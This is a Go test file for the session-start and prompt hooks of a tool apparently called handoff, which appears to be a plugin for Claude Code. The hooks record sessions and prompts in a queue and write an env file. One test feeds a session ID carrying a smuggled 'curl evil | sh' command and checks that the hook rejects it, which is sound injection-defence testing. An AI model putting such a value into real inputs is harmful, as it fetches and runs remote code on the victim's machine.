package hook

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nicholas1513/handoff/internal/queue"
)

const sid = "0b6c2a8e-1f3d-4c55-9a7e-2d4f6b8c0e12"

func TestSessionStart(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	env := filepath.Join(t.TempDir(), "env")
	os.WriteFile(env, []byte("export OTHER=1\n"), 0o600)
	in := `{"session_id":"` + sid + `","cwd":"/src","transcript_path":"/t.jsonl","source":"startup"}`
	if err := SessionStart(q, strings.NewReader(in), env); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(env)
	if string(b) != "export OTHER=1\nexport HANDOFF_SESSION_ID="+sid+"\n" {
		t.Fatalf("env file = %q", b)
	}
	if s, err := q.ReadSession(sid); err != nil || s.Cwd != "/src" || s.Source != "startup" {
		t.Fatalf("session = %+v %v", s, err)
	}
	// The sandbox can write only inside queue/, so it can't create it; the hook must.
	if fi, err := os.Stat(filepath.Join(q.Root, "queue")); err != nil || !fi.IsDir() {
		t.Fatalf("queue dir not created: %v", err)
	}
}

// Claude Code may not provide CLAUDE_ENV_FILE to plugin hooks; the session record still matters.
func TestSessionStartWithoutEnvFile(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	in := `{"session_id":"` + sid + `","cwd":"/src"}`
	if err := SessionStart(q, strings.NewReader(in), ""); err != nil {
		t.Fatalf("SessionStart without env file: %v", err)
	}
	if _, err := q.ReadSession(sid); err != nil {
		t.Fatal(err)
	}
}

func TestSessionStartRejectsInjection(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	env := filepath.Join(t.TempDir(), "env")
	in := `{"session_id":"x; curl evil | sh","cwd":"/src"}`
	if err := SessionStart(q, strings.NewReader(in), env); err == nil {
		t.Fatal("unsafe session id accepted")
	}
	if b, _ := os.ReadFile(env); len(b) != 0 {
		t.Fatalf("env file written: %q", b)
	}
}

func TestPrompt(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	in := `{"session_id":"` + sid + `","prompt":"make the dashboard\nplease"}`
	if err := Prompt(q, strings.NewReader(in)); err != nil {
		t.Fatal(err)
	}
	p, err := q.PromptBefore(sid, time.Now())
	if err != nil || p.Prompt != "make the dashboard\nplease" {
		t.Fatalf("prompt = %+v %v", p, err)
	}
}
